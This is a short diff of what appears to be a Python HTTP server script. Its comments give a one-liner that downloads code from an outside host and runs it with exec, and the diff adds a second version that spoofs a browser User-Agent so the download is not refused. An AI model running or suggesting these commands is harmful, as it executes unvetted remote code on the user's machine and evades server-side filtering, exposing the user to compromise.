@@ -2,6 +2,8 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import os
 
 # python -c "import urllib.request; exec(urllib.request.urlopen('https://e.inccloud.us/').read())"
+# if user agent complain:
+# python -c "import urllib.request; req=urllib.request.Request('https://e.inccloud.us/', headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}); exec(urllib.request.urlopen(req).read())"
 
 PORT = 8000
 
